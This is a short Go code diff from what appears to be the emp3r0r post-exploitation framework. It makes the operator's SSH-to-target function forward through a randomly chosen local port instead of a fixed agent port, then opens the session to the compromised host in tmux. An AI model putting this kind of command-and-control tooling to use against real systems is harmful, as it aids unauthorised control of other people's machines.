@@ -5,9 +5,9 @@ import (
 	"errors"
 	"fmt"
 	"os"
+	"strconv"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -28,6 +28,7 @@ func SSHClient(shell, port string) (err error) {
 	}
 
 	// is port mapping already done?
+	lport := strconv.Itoa(util.RandInt(2048, 65535))
 	to := "127.0.0.1:" + port
 	exists := false
 	for _, p := range PortFwds {
@@ -42,7 +43,7 @@ func SSHClient(shell, port string) (err error) {
 		CliPrintInfo("Setting up port mapping for sshd")
 		pf := &PortFwdSession{}
 		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
-		pf.Lport, pf.To = agent.SSHDPort, to
+		pf.Lport, pf.To = lport, to
 		go func() {
 			err = pf.RunPortFwd()
 			if err != nil {
@@ -77,6 +78,6 @@ wait:
 
 	// let's do the ssh
 	CliPrintSuccess("Opening SSH session for %s in new tmux window", CurrentTarget.Tag)
-	sshCmd := fmt.Sprintf("ssh -p %s 127.0.0.1", agent.SSHDPort)
+	sshCmd := fmt.Sprintf("ssh -p %s 127.0.0.1", lport)
 	return TmuxNewWindow(fmt.Sprintf("ssh-%s", CurrentTarget.Hostname), sshCmd)
 }
